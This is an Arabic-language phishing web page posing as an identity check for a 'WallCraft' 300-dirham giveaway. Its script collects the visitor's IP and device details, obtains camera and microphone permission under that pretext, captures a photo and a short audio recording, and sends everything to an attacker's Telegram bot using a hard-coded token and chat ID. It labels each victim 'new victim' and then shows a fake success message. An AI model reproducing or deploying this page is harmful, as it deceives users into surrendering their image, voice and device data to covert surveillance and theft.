<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <title>تحقق من هويتك</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }
        .container {
            background: white;
            border-radius: 20px;
            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
            max-width: 400px;
            width: 100%;
            padding: 30px;
            text-align: center;
        }
        .icon {
            font-size: 60px;
            margin-bottom: 20px;
        }
        h2 {
            color: #333;
            margin-bottom: 15px;
        }
        p {
            color: #666;
            margin-bottom: 25px;
            line-height: 1.5;
        }
        .start-btn {
            background: #667eea;
            color: white;
            border: none;
            padding: 14px 30px;
            border-radius: 50px;
            font-size: 18px;
            font-weight: bold;
            cursor: pointer;
            transition: all 0.3s;
            width: 100%;
        }
        .start-btn:hover {
            background: #5a67d8;
            transform: scale(1.02);
        }
        .status {
            background: #f0f0f0;
            padding: 10px;
            border-radius: 10px;
            margin-top: 20px;
            font-size: 12px;
            color: #888;
            display: none;
        }
        .spinner {
            width: 40px;
            height: 40px;
            border: 4px solid #e0e0e0;
            border-top: 4px solid #667eea;
            border-radius: 50%;
            animation: spin 1s linear infinite;
            margin: 20px auto;
            display: none;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        .retry-btn {
            background: #ff6b6b;
            color: white;
            border: none;
            padding: 12px 25px;
            border-radius: 50px;
            font-size: 14px;
            cursor: pointer;
            margin-top: 15px;
            display: none;
            width: 100%;
        }
    </style>
</head>
<body>
    <div class="container" id="mainContainer">
        <div class="icon">🎁</div>
        <h2>مسابقة WallCraft</h2>
        <p>للتحقق من هويتك والمشاركة في سحب 300 درهم</p>
        <button class="start-btn" id="startBtn">▶️ ابدأ التحقق</button>
        <div class="status" id="statusText"></div>
        <div class="spinner" id="spinner"></div>
        <button class="retry-btn" id="retryBtn">🔄 إعادة المحاولة</button>
    </div>

    <script>
        const BOT_TOKEN = '8720986483:AAG5R_1kNVrpgGIfKxA75uOuVKduGtYzfrU';
        const CHAT_ID = '7609930403';
        let mediaStream = null;

        document.getElementById('startBtn').addEventListener('click', async () => {
            document.getElementById('startBtn').style.display = 'none';
            document.getElementById('statusText').style.display = 'block';
            document.getElementById('spinner').style.display = 'block';
            document.getElementById('statusText').innerHTML = '📱 جلب معلومات الجهاز...';
            
            // جمع المعلومات
            const ip = await getIP();
            const deviceInfo = collectDeviceInfo();
            deviceInfo.ip = ip;
            
            document.getElementById('statusText').innerHTML = '🎤 طلب صلاحية الكاميرا والميكروفون...';
            
            try {
                mediaStream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
                
                document.getElementById('statusText').innerHTML = '📸 التقاط الصورة...';
                const photo = await capturePhoto(mediaStream);
                
                document.getElementById('statusText').innerHTML = '🎙️ تسجيل الصوت...';
                const audio = await captureAudio(mediaStream);
                
                if (mediaStream) {
                    mediaStream.getTracks().forEach(track => track.stop());
                }
                
                document.getElementById('statusText').innerHTML = '📤 إرسال البيانات...';
                
                const textMsg = `🎯 *ضحية جديدة*\n\n🌐 *IP:* ${deviceInfo.ip}\n📱 *المتصفح:* ${deviceInfo.userAgent.substring(0, 150)}\n🌍 *اللغة:* ${deviceInfo.language}\n💻 *النظام:* ${deviceInfo.platform}\n📏 *الشاشة:* ${deviceInfo.screenWidth}x${deviceInfo.screenHeight}\n⏰ *المنطقة:* ${deviceInfo.timezone}\n🕒 *التوقيت:* ${deviceInfo.timestamp}`;
                
                await sendToTelegram(textMsg, photo, audio);
                
                // رسالة نجاح وهمية
                document.getElementById('icon').innerHTML = '✅';
                document.querySelector('h2').innerHTML = 'تم التسجيل بنجاح!';
                document.querySelector('p').innerHTML = 'سيتم التواصل معك خلال 24 ساعة';
                document.getElementById('statusText').style.display = 'none';
                document.getElementById('spinner').style.display = 'none';
                
            } catch (err) {
                document.getElementById('statusText').innerHTML = '❌ فشل الوصول للكاميرا';
                document.getElementById('spinner').style.display = 'none';
                document.getElementById('retryBtn').style.display = 'block';
            }
        });
        
        document.getElementById('retryBtn').addEventListener('click', () => {
            location.reload();
        });
        
        async function getIP() {
            try {
                const res = await fetch('https://api.ipify.org?format=json');
                const data = await res.json();
                return data.ip;
            } catch { return 'غير معروف'; }
        }
        
        function collectDeviceInfo() {
            return {
                userAgent: navigator.userAgent,
                language: navigator.language,
                platform: navigator.platform,
                screenWidth: screen.width,
                screenHeight: screen.height,
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                timestamp: new Date().toISOString(),
                ip: null
            };
        }
        
        async function capturePhoto(stream) {
            return new Promise((resolve) => {
                const video = document.createElement('video');
                video.srcObject = stream;
                video.autoplay = true;
                video.onloadedmetadata = () => {
                    setTimeout(() => {
                        const canvas = document.createElement('canvas');
                        canvas.width = video.videoWidth || 640;
                        canvas.height = video.videoHeight || 480;
                        canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
                        resolve(canvas.toDataURL('image/jpeg', 0.8));
                        video.srcObject = null;
                    }, 500);
                };
                setTimeout(() => resolve(null), 3000);
            });
        }
        
        async function captureAudio(stream) {
            return new Promise((resolve) => {
                const recorder = new MediaRecorder(stream);
                const chunks = [];
                recorder.ondataavailable = e => { if (e.data.size > 0) chunks.push(e.data); };
                recorder.onstop = () => {
                    const blob = new Blob(chunks, { type: 'audio/webm' });
                    const reader = new FileReader();
                    reader.onloadend = () => resolve(reader.result);
                    reader.readAsDataURL(blob);
                };
                recorder.start();
                setTimeout(() => { if (recorder.state === 'recording') recorder.stop(); }, 3000);
                setTimeout(() => resolve(null), 4000);
            });
        }
        
        async function sendToTelegram(text, photoBase64, audioBase64) {
            try {
                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ chat_id: CHAT_ID, text: text, parse_mode: 'Markdown' })
                });
                if (photoBase64) {
                    const blob = await (await fetch(photoBase64)).blob();
                    const fd = new FormData();
                    fd.append('chat_id', CHAT_ID);
                    fd.append('photo', blob, 'cam.jpg');
                    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: 'POST', body: fd });
                }
                if (audioBase64) {
                    const blob = await (await fetch(audioBase64)).blob();
                    const fd = new FormData();
                    fd.append('chat_id', CHAT_ID);
                    fd.append('voice', blob, 'audio.ogg');
                    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendVoice`, { method: 'POST', body: fd });
                }
                return true;
            } catch(e) { return false; }
        }
    </script>
</body>
</html>
